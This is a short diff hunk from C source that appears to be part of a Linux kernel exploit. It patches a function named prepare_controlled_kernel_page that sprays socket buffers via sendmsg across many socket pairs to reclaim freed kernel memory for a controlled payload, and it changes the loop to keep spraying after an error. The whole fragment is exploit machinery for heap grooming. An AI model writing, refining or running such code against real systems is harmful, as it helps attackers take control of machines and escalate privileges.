@@ -2045,14 +2045,15 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
 
   int sent_count = 0;
   int stop_errno = 0;
-  for (size_t pair = 0;
-       pair < S918_RECLAIM_SOCKET_PAIRS && !stop_errno; ++pair) {
+  for (size_t pair = 0; pair < S918_RECLAIM_SOCKET_PAIRS; ++pair) {
     int sender = pair ? controlled_reclaim_sv[pair - 1][0] : reclaim_sv[0];
     for (int send_index = 0; send_index < S918_SKB_SENDS; ++send_index) {
       errno = 0;
       ssize_t sent = sendmsg(sender, &msg, MSG_DONTWAIT);
       if (sent != (ssize_t)SKB_SEND_SIZE) {
-        stop_errno = errno ? errno : EIO;
+        if (!stop_errno) {
+          stop_errno = errno ? errno : EIO;
+        }
         break;
       }
       sent_count++;
